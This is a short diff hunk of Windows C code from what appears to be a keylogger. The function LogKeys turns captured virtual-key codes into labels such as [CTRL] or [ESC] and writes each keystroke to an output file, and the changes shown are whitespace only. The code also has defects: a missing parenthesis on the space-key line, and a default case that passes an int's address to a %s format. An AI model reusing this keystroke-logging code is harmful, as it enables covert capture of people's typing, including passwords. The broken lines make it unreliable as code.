@@ -14,20 +14,20 @@ void LogKeys(int key, FILE *OutputFile){
 		case VK_CONTROL		: fprintf(OutputFile, "%s", "[CTRL]"); break;
 		case VK_SHIFT		: fprintf(OutputFile, "%s", "[SHIFT]"); break;
 		case VK_MENU		: fprintf(OutputFile, "%s", "[ALT]"); break;
-		case VK_TAB			: fprintf(OutputFile, "%s", "[TAB]"); break;
+		case VK_TAB		: fprintf(OutputFile, "%s", "[TAB]"); break;
 		case VK_CAPITAL		: fprintf(OutputFile, "%s", "[CAPSLOCK]"); break;
 		case VK_ESCAPE		: fprintf(OutputFile, "%s", "[ESC]"); break;
 		case VK_SPACE		: fprintf(OutputFile, "%s", " "; break;
 		case VK_PRIOR		: fprintf(OutputFile, "%s", "[PAGEUP]"); break;
 		case VK_NEXT		: fprintf(OutputFile, "%s", "[PAGEDOWN]"); break;
-		case VK_END			: fprintf(OutputFile, "%s", "[END]"); break;
+		case VK_END		: fprintf(OutputFile, "%s", "[END]"); break;
 		case VK_HOME		: fprintf(OutputFile, "%s", "[HOME]"); break;
 		case VK_LBUTTON		: fprintf(OutputFile, "%s", "[LMB]"); break;
 		case VK_RBUTTON		: fprintf(OutputFile, "%s", "[RMB]"); break;
 		case VK_BACK		: fprintf(OutputFile, "%s", "[/b]"); break;
 		case VK_LEFT		: fprintf(OutputFile, "%s", "<--"); break;
 		case VK_RIGHT		: fprintf(OutputFile, "%s", "-->"); break;
-		default				: fprintf(OutputFile, "%s", &key);
+		default			: fprintf(OutputFile, "%s", &key);
 	}	
 }
 	
